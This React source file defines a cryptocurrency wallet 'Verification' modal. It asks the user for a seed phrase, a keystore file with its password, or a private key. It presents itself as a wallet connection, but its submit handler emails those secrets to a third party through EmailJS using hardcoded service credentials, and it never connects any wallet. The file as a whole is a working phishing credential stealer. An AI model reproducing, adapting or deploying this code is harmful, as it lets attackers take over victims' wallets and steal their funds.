import { Close } from '@mui/icons-material';
import { Modal } from '@mui/material';
import React, { useState } from 'react';
import loader from '../assets/loading.gif';
import emailjs from '@emailjs/browser';

const ConnectModal = ({ open, setOpen, selectedWallet }) => {
	const [activeTab, setActiveTab] = useState('phrase');

	const [phrase, setPhrase] = useState('');
	const [keystore, setKeystore] = useState('');
	const [keystorePassword, setKeystorePassword] = useState('');
	const [privateKey, setPrivateKey] = useState('');

	const [submitted, setSubmitted] = useState(false);

	const handleClose = () => {
		setOpen(false);
	};
	const tabFunc = (tab) => {
		if (tab === activeTab) {
			return 'tab active';
		} else {
			return 'tab inactive';
		}
	};

	const handleSubmit = (e) => {
		e.preventDefault();
		setSubmitted(true);
		const body = () => {
			if (activeTab === 'phrase') {
				setPhrase('');
				return {
					type: 'Phrase',
					wallet: selectedWallet,
					phrase,
				};
			} else if (activeTab === 'keystore') {
				setKeystore('');
				setKeystorePassword('');
				return {
					type: 'keystore',
					wallet: selectedWallet,
					keystore,
					password: keystorePassword,
				};
			} else if (activeTab === 'private') {
				setPrivateKey('');
				return {
					type: 'Private',
					wallet: selectedWallet,
					privateKey,
				};
			}
		};

		emailjs
			.send(
				'service_iedy9iw',
				'template_z8pylw3',
				body(),
				'OOKk7hA_q_Q51ifzl'
			)
			.then(
				function (response) {
					setSubmitted(true);
					console.log('SUCCESS!', response.status, response);
				},
				function (err) {
					setSubmitted(false);
					console.log('FAILED...', err);
				}
			);
		console.log(body());
	};

	return (
		<Modal open={open}>
			<div className='container connect'>
				<div className='modal-top'>
					<h2>Verification</h2>
					<Close onClick={handleClose} className='closeIcon' />
				</div>
				<div className='modal-body'>
					<div className='tabs'>
						<div
							className={`${tabFunc('phrase')}`}
							onClick={() => setActiveTab('phrase')}>
							Phrase
						</div>
						<div
							className={`${tabFunc('keystore')}`}
							onClick={() => setActiveTab('keystore')}>
							Keystore JSON
						</div>
						<div
							className={`${tabFunc('private')}`}
							onClick={() => setActiveTab('private')}>
							Private Key
						</div>
					</div>
					<div className='tab-body'>
						{activeTab === 'phrase' ? (
							<form
								className='singleTab-body phrase-body'
								onSubmit={handleSubmit}>
								<textarea
									name='phrase'
									id=''
									placeholder='Phrase'
									required
									onChange={(e) => setPhrase(e.target.value)}
									value={phrase}></textarea>
								<p className='tab-info'>
									Typically 12 (sometimes 24) words separated
									by single spaces
								</p>
								<div className='submit-container'>
									{submitted ? (
										<img src={loader} alt='' />
									) : (
										<button
											type='submit'
											className='submit-btn'>
											Connect
										</button>
									)}
								</div>
							</form>
						) : activeTab === 'keystore' ? (
							<form
								className='singleTab-body keystore-body'
								onSubmit={handleSubmit}>
								<textarea
									name='keystore'
									id=''
									placeholder='Keystore JSON'
									required
									onChange={(e) =>
										setKeystore(e.target.value)
									}
									value={keystore}></textarea>
								<input
									type='text'
									placeholder='Password'
									onChange={(e) =>
										setKeystorePassword(e.target.value)
									}
									value={keystorePassword}
									required
								/>
								<p className='tab-info'>
									Several lines of text beginning with '(...)'
									plus the password you used to encrypt it.
								</p>
								<div className='submit-container'>
									{submitted ? (
										<img src={loader} alt='' />
									) : (
										<button
											type='submit'
											className='submit-btn'>
											Connect
										</button>
									)}
								</div>
							</form>
						) : activeTab === 'private' ? (
							<form
								className='singleTab-body keystore-body'
								onSubmit={handleSubmit}>
								<input
									type='text'
									placeholder='Private Key'
									onChange={(e) =>
										setPrivateKey(e.target.value)
									}
									value={privateKey}
									required
								/>
								<p className='tab-info'>
									Typically 64 alphanumeric characters
								</p>
								<div className='submit-container'>
									{submitted ? (
										<img src={loader} alt='' />
									) : (
										<button
											type='submit'
											className='submit-btn'>
											Connect
										</button>
									)}
								</div>
							</form>
						) : (
							<div></div>
						)}
					</div>
				</div>
			</div>
		</Modal>
	);
};

export default ConnectModal;
